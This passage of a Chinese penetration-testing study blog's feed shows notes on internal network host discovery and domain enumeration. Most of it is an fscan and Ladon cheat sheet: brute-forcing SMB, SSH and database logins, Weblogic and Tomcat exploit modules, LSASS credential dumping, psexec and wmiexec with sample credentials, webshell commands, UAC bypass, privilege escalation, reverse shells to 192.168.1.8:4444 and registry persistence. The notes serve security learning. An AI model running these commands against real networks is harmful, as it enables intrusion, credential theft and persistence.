+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822183322690.png" alt="image-20230822183322690" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网学习day8]]></title>
+        <id>https://f9f.fun/post/nei-wang-xue-xi-day8/</id>
+        <link href="https://f9f.fun/post/nei-wang-xue-xi-day8/">
+        </link>
+        <updated>2023-08-22T09:58:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="内网学习day8">内网学习day8</h1>
+<h1 id="内网ip扫描">内网IP扫描</h1>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822123202830.png" alt="image-20230822123202830" loading="lazy"></figure>
+<h2 id="icmp协议扫描">ICMP协议扫描</h2>
+<p><strong>ICMP协议介绍</strong>：ICMP是(Internet Control Message Protocol)Internet<strong>控制报文协议</strong>。它是 TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、 主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于 用户数据的传递起着重要的作用</p>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822123417642.png" alt="image-20230822123417642" loading="lazy"></figure>
+<p>icmp扫描动静小</p>
+<h3 id="一-使用ping命令配合cmd语法进行c端扫描">一、使用PING命令配合CMD语法进行C端扫描</h3>
+<p><strong>命令：</strong></p>
+<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=</p>
+<p>结果：</p>
+<h3 id="二-使用fping是一个小型命令行工具">二、使用fping是一个小型命令行工具，</h3>
+<p>用于向网络主机发送ICMP 回应请求，类似于ping，但在ping多 个主机时性能要高得多。 fping完全不同于ping，一位可以指定IP数量和网段，常用用法如下</p>
+<p>命令：</p>
+<p>fping IP1 IP2 -c 10   扫描多个IP 10次</p>
+<p>fping -a -g 172.18.9.0/24    扫描C</p>
+<p>结果：</p>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822131650162.png" alt="image-20230822131650162" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822131800784.png" alt="image-20230822131800784" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822131830662.png" alt="image-20230822131830662" loading="lazy"></figure>
+<h2 id="arp协议扫描">ARP协议扫描</h2>
+<p>ARP协议介绍 <strong>地址解析协议</strong>，即ARP(Address Resolution Protocol)，是根据IP地 址获取物理地址的一个TCP/IP协议</p>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822132044820.png" alt="image-20230822132044820" loading="lazy"></figure>
+<h3 id="一-使用本地自带arp命令查看arp缓存表信息">一、使用本地自带ARP命令查看ARP缓存表信息</h3>
+<p>命令：Arp –a</p>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822132332593.png" alt="image-20230822132332593" loading="lazy"></figure>
+<h3 id="二-使用arp的工具进行探测">二、使用arp的工具进行探测</h3>
+<p>命令：Apr.exe -t IP段</p>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822132547698.png" alt="image-20230822132547698" loading="lazy"></figure>
+<h2 id="netbios协议扫描">NETBIOS协议扫描</h2>
+<p><strong>NetBIOS协议</strong>介绍NetBIOS协议是由IBM公司开发，主要用于数十台计算机的小型局域网。 NetBIOS协议是一种在局域网上的程序可以使用的应用程序编程接口(API)，为程序提供了请求低级服 务的统一的命令集，作用是为了给局域网提供网络以及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，在网络中使用计算机名通讯就是使用NetBIOS协议， NetBIOS协议,主 要用于局域网通信,开启之后,局域网的其他计算机可以发现并找到你的计算机</p>
+<p><strong>netbios默认是启用的</strong></p>
+<h3 id="一-可以使用工具进行扫描">一、可以使用工具进行扫描</h3>
+<p>命令：nbtscan.exe + IP</p>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822133122034.png" alt="image-20230822133122034" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822133224455.png" alt="image-20230822133224455" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822133307014.png" alt="image-20230822133307014" loading="lazy"></figure>
+<p>以上协议扫描都比较费劲麻烦</p>
+<h2 id="fscan扫描">fscan扫描</h2>
+<p><strong>FSCAN介绍</strong>：一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、 端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指 纹识别、web漏洞扫描、netbios探测、域控识别等功能</p>
+<p>项目地址：https://github.com/shadow1ng/fscan</p>
+<p>Fsan的用法非常多。</p>
+<ol>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</p>
+</li>
+<li>
+<p>fscan.exe -hf ip.txt (以文件导入)</p>
+</li>
+<li>
+<p>fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</p>
+</li>
+<li>
+<p>fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822134521292.png" alt="image-20230822134521292" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822134531310.png" alt="image-20230822134531310" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822134541557.png" alt="image-20230822134541557" loading="lazy"></figure>
+<h2 id="kscan工具扫描">KSCAN工具扫描</h2>
+<p><strong>kscan是一款资产测绘工具</strong>，可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在 不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴 力破解，且是go平台首款开源的RDP暴力破解工具</p>
+<p>项目地址： https://github.com/lcvvvv/kscan</p>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822135704906.png" alt="image-20230822135704906" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822135717605.png" alt="image-20230822135717605" loading="lazy"></figure>
+<p>有点乱码</p>
+<p>用自己电脑cmd演示一下</p>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822135813126.png" alt="image-20230822135813126" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822135838311.png" alt="image-20230822135838311" loading="lazy"></figure>
+<p><strong>ksacn.exe -t 192.168.131.0/24</strong></p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822140003794.png" alt="image-20230822140003794" loading="lazy"></figure>
+<p>可以扫出端口 协议 指纹 所以速度会慢些</p>
+<h2 id="ladon工具扫描">Ladon工具扫描</h2>
+<p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，<strong>含端口扫描、服务识别、网络资产、密 码爆破、高危漏洞检测以及一键GetShell</strong>，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、 域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络 存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、 开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、 Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、 Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、 Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可 识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、 DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令， EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网 进行横向移动。</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822142306560.png" alt="image-20230822142306560" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822142448437.png" alt="image-20230822142448437" loading="lazy"></figure>
+<p>cs ladon插件直接查</p>
+<p>用法</p>
+<p><strong>001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）</strong></p>
+<p>Ladon 192.168.1.8/24 OnlinePC</p>
+<h5 id="002-多协议识别操作系统-ip-机器名-操作系统版本-开放服务">002 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）</h5>
+<p>Ladon 192.168.1.8/24 OsScan</p>
+<h5 id="003-扫描存活主机">003 扫描存活主机</h5>
+<p>Ladon 192.168.1.8/24 OnlineIP</p>
+<h5 id="004-icmp扫描存活主机">004 ICMP扫描存活主机</h5>
+<p>Ladon 192.168.1.8/24 Ping</p>
+<h5 id="005-扫描smb漏洞ms17010-ip-机器名-漏洞编号-操作系统版本">005 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）</h5>
+<p>Ladon 192.168.1.8/24 MS17010</p>
+<h5 id="006-smbghost漏洞检测-cve-2020-0796-ip-机器名-漏洞编号-操作系统版本">006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）</h5>
+<p>Ladon 192.168.1.8/24 SMBGhost</p>
+<h5 id="007-扫描web信息http服务">007 扫描Web信息/Http服务</h5>
+<p>Ladon 192.168.1.8/24 WebScan</p>
+<h5 id="008-扫描c段站点url域名">008 扫描C段站点URL域名</h5>
+<p>Ladon 192.168.1.8/24 UrlScan</p>
+<h5 id="009-扫描c段站点url域名">009 扫描C段站点URL域名</h5>
+<p>Ladon 192.168.1.8/24 SameWeb</p>
+<h5 id="010-扫描子域名-二级域名">010 扫描子域名、二级域名</h5>
+<p>Ladon baidu.com SubDomain</p>
+<h5 id="011-域名解析ip-主机名解析ip">011 域名解析IP、主机名解析IP</h5>
+<p>Ladon baidu.com DomainIP Ladon baidu.com HostIP</p>
+<h5 id="012-域内机器信息获取">012 域内机器信息获取</h5>
+<p>Ladon AdiDnsDump 192.168.1.8 （Domain IP）</p>
+<h5 id="013-扫描c段端口-指定端口扫描">013 扫描C段端口、指定端口扫描</h5>
+<p>Ladon 192.168.1.8/24 PortScan Ladon 192.168.1.8 PortScan 80,445,3389</p>
+<h5 id="014-扫描c段web以及cms75种web指纹识别">014 扫描C段WEB以及CMS（75种Web指纹识别）</h5>
+<p>Ladon 192.168.1.8/24 WhatCMS</p>
+<h5 id="015-扫描思科设备">015 扫描思科设备</h5>
+<p>Ladon 192.168.1.8/24 CiscoScan Ladon <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.8">http://192.168.1.8</a> CiscoScan</p>
+<h5 id="016-枚举mssql数据库主机-数据库ip-机器名-sql版本">016 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）</h5>
+<p>Ladon EnumMssql</p>
+<h5 id="017-枚举网络共享资源-域-存活ip-共享路径">017 枚举网络共享资源 （域、存活IP、共享路径）</h5>
+<p>Ladon EnumShare</p>
+<h5 id="018-扫描ldap服务器">018 扫描LDAP服务器</h5>
+<p>Ladon 192.168.1.8/24 LdapScan</p>
+<h5 id="019-扫描ftp服务器">019 扫描FTP服务器</h5>
+<p>Ladon 192.168.1.8/24 FtpScan</p>
+<h3 id="暴力破解网络认证弱口令密码爆破数据库网站后台登陆口系统登陆">暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆</h3>
+<p>密码爆破详解参考SSH：<a href="https://gitee.com/link?target=http%3A%2F%2Fk8gege.org%2FLadon%2Fsshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
+<h5 id="020-445端口-smb密码爆破windows">020 445端口 SMB密码爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 SmbScan</p>
+<h5 id="021-135端口-wmi密码爆破windowns">021 135端口 Wmi密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 WmiScan</p>
+<h5 id="022-389端口-ldap服务器-ad域密码爆破windows">022 389端口 LDAP服务器、AD域密码爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 LdapScan</p>
+<h5 id="023-5985端口-winrm密码爆破windowns">023 5985端口 Winrm密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 WinrmScan.ini</p>
+<h5 id="024-445端口-smb-ntlm-hash爆破windows">024 445端口 SMB NTLM HASH爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 SmbHashScan</p>
+<h5 id="025-135端口-wmi-ntlm-hash爆破windows">025 135端口 Wmi NTLM HASH爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 WmiHashScan</p>
+<h5 id="026-22端口-ssh密码爆破linux">026 22端口 SSH密码爆破(Linux)</h5>
+<p>Ladon 192.168.1.8/24 SshScan Ladon 192.168.1.8:22 SshScan</p>
+<h5 id="027-1433端口-mssql数据库密码爆破">027 1433端口 Mssql数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 MssqlScan</p>
+<h5 id="028-1521端口-oracle数据库密码爆破">028 1521端口 Oracle数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 OracleScan</p>
+<h5 id="029-3306端口-mysql数据库密码爆破">029 3306端口 Mysql数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 MysqlScan</p>
+<h5 id="030-7001端口-weblogic后台密码爆破">030 7001端口 Weblogic后台密码爆破</h5>
+<p>Ladon <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.8%3A7001%2Fconsole">http://192.168.1.8:7001/console</a> WeblogicScan Ladon 192.168.1.8/24 WeblogicScan</p>
+<h5 id="031-5900端口-vnc远程桌面密码爆破">031 5900端口 VNC远程桌面密码爆破</h5>
+<p>Ladon 192.168.1.8/24 VncScan</p>
+<h5 id="032-21端口-ftp服务器密码爆破">032 21端口 Ftp服务器密码爆破</h5>
+<p>Ladon 192.168.1.8/24 FtpScan</p>
+<h5 id="033-8080端口-tomcat后台登陆密码爆破">033 8080端口 Tomcat后台登陆密码爆破</h5>
+<p>Ladon 192.168.1.8/24 TomcatScan Ladon <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.8%3A8080%2Fmanage">http://192.168.1.8:8080/manage</a> TomcatScan</p>
+<h5 id="034-web端口-401基础认证密码爆破">034 Web端口 401基础认证密码爆破</h5>
+<p>Ladon <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.8%2Flogin">http://192.168.1.8/login</a> HttpBasicScan</p>
+<h5 id="035-445端口-impacket-smb密码爆破windowns">035 445端口 Impacket SMB密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 SmbScan.ini</p>
+<h5 id="036-445端口-ipc密码爆破windowns">036 445端口 IPC密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 IpcScan.ini</p>
+<h3 id="漏洞检测漏洞利用pocexp">漏洞检测/漏洞利用/Poc/Exp</h3>
+<h5 id="037-smb漏洞检测cve-2017-0143cve-2017-0144">037 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)</h5>
+<p>Ladon 192.168.1.8/24 MS17010</p>
+<h5 id="038-weblogic漏洞检测cve-2019-2725cve-2018-2894">038 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)</h5>
+<p>Ladon 192.168.1.8/24 WeblogicPoc</p>
+<h5 id="039-phpstudy后门检测phpstudy-2016phpstudy-2018">039 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)</h5>
+<p>Ladon 192.168.1.8/24 PhpStudyPoc</p>
+<h5 id="040-activemq漏洞检测cve-2016-3088">040 ActiveMQ漏洞检测(CVE-2016-3088)</h5>
+<p>Ladon 192.168.1.8/24 ActivemqPoc</p>
+<h5 id="041-tomcat漏洞检测cve-2017-12615">041 Tomcat漏洞检测(CVE-2017-12615)</h5>
+<p>Ladon 192.168.1.8/24 TomcatPoc</p>
+<h5 id="042-weblogic漏洞利用cve-2019-2725">042 Weblogic漏洞利用(CVE-2019-2725)</h5>
+<p>Ladon 192.168.1.8/24 WeblogicExp</p>
+<h5 id="043-tomcat漏洞利用cve-2017-12615">043 Tomcat漏洞利用(CVE-2017-12615)</h5>
+<p>Ladon 192.168.1.8/24 TomcatExp</p>
+<h5 id="044-struts2漏洞检测s2-005s2-009s2-013s2-016s2-019s2-032devmode">044 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</h5>
+<p>Ladon 192.168.1.8/24 Struts2Poc</p>
+<h3 id="ftp下载-http下载">FTP下载、HTTP下载</h3>
+<h5 id="045-http下载">045 HTTP下载</h5>
+<p>Ladon HttpDownLoad <a href="https://gitee.com/link?target=http%3A%2F%2Fk8gege.org%2FDownload%2FLadon.rar">http://k8gege.org/Download/Ladon.rar</a></p>
+<h5 id="046-ftp下载">046 Ftp下载</h5>
+<p>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</p>
+<h3 id="加密解密hexbase64">加密解密(HEX/Base64)</h3>
+<h5 id="047-hex加密解密">047 Hex加密解密</h5>
+<p>Ladon 123456 EnHex Ladon 313233343536 DeHex</p>
+<h5 id="048-base64加密解密">048 Base64加密解密</h5>
+<p>Ladon 123456 EnBase64 Ladon MTIzNDU2 DeBase64</p>
+<h3 id="网络嗅探">网络嗅探</h3>
+<h5 id="049-ftp密码嗅探">049 Ftp密码嗅探</h5>
+<p>Ladon FtpSniffer 192.168.1.5</p>
+<h5 id="050-http密码嗅探">050 HTTP密码嗅探</h5>
+<p>Ladon HTTPSniffer 192.168.1.5</p>
+<h5 id="051-网络嗅探">051 网络嗅探</h5>
+<p>Ladon Sniffer</p>
+<h3 id="密码读取">密码读取</h3>
+<h5 id="052-读取iis站点密码-网站路径">052 读取IIS站点密码、网站路径</h5>
+<p>Ladon IISpwd</p>
+<h5 id="dumplsass内存密码">DumpLsass内存密码</h5>
+<p>Ladon DumpLsass</p>
+<h3 id="信息收集">信息收集</h3>
+<h5 id="053-进程详细信息">053 进程详细信息</h5>
+<p>Ladon EnumProcess Ladon Tasklist</p>
+<h5 id="054-获取命令行参数">054 获取命令行参数</h5>
+<p>Ladon cmdline Ladon cmdline cmd.exe</p>
+<h5 id="055-获取渗透基础信息">055 获取渗透基础信息</h5>
+<p>Ladon GetInfo Ladon GetInfo2</p>
+<h5 id="056-net-powershell版本">056 .NET &amp; PowerShell版本</h5>
+<p>Ladon NetVer Ladon PSver Ladon NetVersion Ladon PSversion</p>
+<h5 id="057-运行时版本编译环境">057 运行时版本&amp;编译环境</h5>
+<p>Ladon Ver Ladon Version</p>
+<h3 id="远程执行psexecwmiexecatexecsshexec">远程执行(psexec/wmiexec/atexec/sshexec)</h3>
+<h5 id="445端口-psexec远程执行命令交互式">445端口 PSEXEC远程执行命令（交互式）</h5>
+<p>net user \192.168.1.8 k8gege520 /user:k8gege Ladon psexec 192.168.1.8 psexec&gt; whoami nt authority\system</p>
+<h5 id="058-135端口-wmiexec远程执行命令-非交互式">058 135端口 WmiExec远程执行命令 （非交互式）</h5>
+<p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</p>
+<h5 id="059-445端口-atexec远程执行命令非交互式">059 445端口 AtExec远程执行命令（非交互式）</h5>
+<p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</p>
+<h5 id="060-22端口-sshexec远程执行命令非交互式">060 22端口 SshExec远程执行命令（非交互式）</h5>
+<p>Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami</p>
+<h5 id="061-jspshell远程执行命令非交互式">061 JspShell远程执行命令（非交互式）</h5>
+<p>Usage：Ladon JspShell type url pwd cmd Example: Ladon JspShell ua <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.8%2Fshell.jsp">http://192.168.1.8/shell.jsp</a> Ladon whoami</p>
+<h4 id="062-webshell远程执行命令非交互式">062 WebShell远程执行命令（非交互式）</h4>
+<pre><code>Usage：Ladon WebShell ScriptType ShellType url pwd cmd
+Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
+Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
+Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
+</code></pre>
+<h3 id="提权降权">提权降权</h3>
+<h5 id="063-bypassuac-绕过uac执行支持win7-win10">063 BypassUac 绕过UAC执行,支持Win7-Win10</h5>
+<p>Ladon BypassUac c:\1.exe Ladon BypassUac c:\1.bat</p>
+<h5 id="064-getsystem-提权或降权运行程序">064 GetSystem 提权或降权运行程序</h5>
+<p>Ladon GetSystem cmd.exe Ladon GetSystem cmd.exe explorer</p>
+<h5 id="065-runas-模拟用户执行命令">065 Runas 模拟用户执行命令</h5>
+<p>Ladon Runas user pass cmd</p>
+<h3 id="其它功能">其它功能</h3>
+<h5 id="066-win2008一键启用net-35">066 Win2008一键启用.net 3.5</h5>
+<p>Ladon EnableDotNet</p>
+<h5 id="067-获取内网站点html源码">067 获取内网站点HTML源码</h5>
+<p>Ladon gethtml <a href="https://gitee.com/link?target=http%3A%2F%2F192.168.1.1">http://192.168.1.1</a></p>
+<h5 id="068-检测后门">068 检测后门</h5>
+<p>Ladon CheckDoor Ladon AutoRun</p>
+<h5 id="069-获取本机内网ip与外网ip">069 获取本机内网IP与外网IP</h5>
+<p>Ladon GetIP</p>
+<h5 id="070-一键迷你web服务器">070 一键迷你WEB服务器</h5>
+<p>Ladon WebSer 80 Ladon web 80</p>
+<h3 id="反弹shell">反弹Shell</h3>
+<h5 id="071-反弹tcp-nc-shell">071 反弹TCP NC Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 nc</p>
+<h5 id="072-反弹tcp-msf-shell">072 反弹TCP MSF Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 shell</p>
+<h5 id="073-反弹tcp-msf-met-shell">073 反弹TCP MSF MET Shell</h5>
+<p>Ladon ReverseTcp 192.168.1.8 4444 meter</p>
+<h5 id="074-反弹http-msf-met-shell">074 反弹HTTP MSF MET Shell</h5>
+<p>Ladon ReverseHttp 192.168.1.8 4444</p>
+<h5 id="075-反弹https-msf-met-shell">075 反弹HTTPS MSF MET Shell</h5>
+<p>Ladon ReverseHttps 192.168.1.8 4444</p>
+<h5 id="076-反弹tcp-cmd-powershell-shell">076 反弹TCP CMD &amp; PowerShell Shell</h5>
+<p>Ladon PowerCat 192.168.1.8 4444 cmd Ladon PowerCat 192.168.1.8 4444 psh</p>
+<h5 id="077-反弹udp-cmd-powershell-shell">077 反弹UDP Cmd &amp; PowerShell Shell</h5>
+<p>Ladon PowerCat 192.168.1.8 4444 cmd udp Ladon PowerCat 192.168.1.8 4444 psh udp</p>
+<h5 id="078-rdp桌面会话劫持无需密码">078 RDP桌面会话劫持（无需密码）</h5>
+<p>Ladon RDPHijack 3 Ladon RDPHijack 3 console</p>
+<h5 id="079-oxid定位多网卡主机">079 OXID定位多网卡主机</h5>
+<p>Ladon 192.168.1.8/24 EthScan Ladon 192.168.1.8/24 OxidScan</p>
+<h4 id="080-查看用户最近访问文件">080 查看用户最近访问文件</h4>
+<p>Ladon Recent</p>
+<h4 id="081-添加注册表run启动项">081 添加注册表Run启动项</h4>
+<p>Ladon RegAuto Test c:\123.exe</p>
+<h4 id="082-at计划执行程序无需时间system权限">082 AT计划执行程序(无需时间)(system权限)</h4>
+<p>Ladon at c:\123.exe Ladon at c:\123.exe gui</p>
+<h4 id="083-sc服务加启动项执行程序system权限">083 SC服务加启动项&amp;执行程序(system权限）</h4>
+<p>Ladon sc c:\123.exe Ladon sc c:\123.exe gui Ladon sc c:\123.exe auto ServerName</p>
+<h4 id="084-ms16135提权至system">084 MS16135提权至SYSTEM</h4>
+<p>Ladon ms16135 whoami</p>
+<h5 id="085-badpotato服务用户提权至system">085 BadPotato服务用户提权至SYSTEM</h5>
+<p>Ladon BadPotato cmdline</p>
+<h5 id="086-sweetpotato服务用户提权至system">086 SweetPotato服务用户提权至SYSTEM</h5>
+<p>Ladon SweetPotato cmdline</p>
+<h5 id="087-whoami查看当前用户权限以及特权">087 whoami查看当前用户权限以及特权</h5>
+<p>Ladon whoami</p>
+<h5 id="088-open3389一键开启3389">088 Open3389一键开启3389</h5>
+<p>Ladon Open3389</p>
+<h5 id="089-rdplog查看3389连接记录">089 RdpLog查看3389连接记录</h5>
+<p>Ladon RdpLog</p>
+<h5 id="090-queryadmin查看管理员用户">090 QueryAdmin查看管理员用户</h5>
+<p>Ladon QueryAdmin</p>
+<h5 id="091-激活内置管理员administrator">091 激活内置管理员Administrator</h5>
+<p>Ladon ActiveAdmin</p>
+<h5 id="092-激活内置用户guest">092 激活内置用户Guest</h5>
+<p>Ladon ActiveGuest</p>
+<h5 id="093-查看本机命名管道">093 查看本机命名管道</h5>
+<p>Ladon GetPipe</p>
+<h5 id="094-139端口netbios协议windows密码爆破">094 139端口Netbios协议Windows密码爆破</h5>
+<p>Ladon 192.168.1.8/24 NbtScan</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网学习day7]]></title>
+        <id>https://f9f.fun/post/nei-wang-xue-xi-day7/</id>
+        <link href="https://f9f.fun/post/nei-wang-xue-xi-day7/">
+        </link>
+        <updated>2023-08-11T16:07:00.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="内网学习day7">内网学习day7</h1>
+<h1 id="域内信息收集">域内信息收集</h1>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184004774.png" alt="image-20230811184004774" loading="lazy"></figure>
+<h2 id="域内基本信息收集">域内基本信息收集</h2>
+<p>当一台电脑加入域后就可以向域内发起查询</p>
+<h3 id="查询权限">查询权限</h3>
+<p>whoami</p>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184803665.png" alt="image-20230811184803665" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184413242.png" alt="image-20230811184413242" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184430848.png" alt="image-20230811184430848" loading="lazy"></figure>
+<p>我这普通用户查询不了域内信息</p>
+<h2 id="判断域的存在">判断域的存在</h2>
+<ol>
+<li>
+<p>Ipconfig /all命令</p>
+</li>
+<li>
+<p>SystemInfo</p>
+</li>
+<li>
+<p>net config workstation</p>
+</li>
+<li>
+<p>Net time /domain （需要管理员权限）</p>
+<p>以上的命令都可以查询是否存在域</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184559545.png" alt="image-20230811184559545" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184622262.png" alt="image-20230811184622262" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811184650360.png" alt="image-20230811184650360" loading="lazy"></figure>
+<h3 id="查询所有域内成员计算机列表">查询所有域内成员计算机列表</h3>
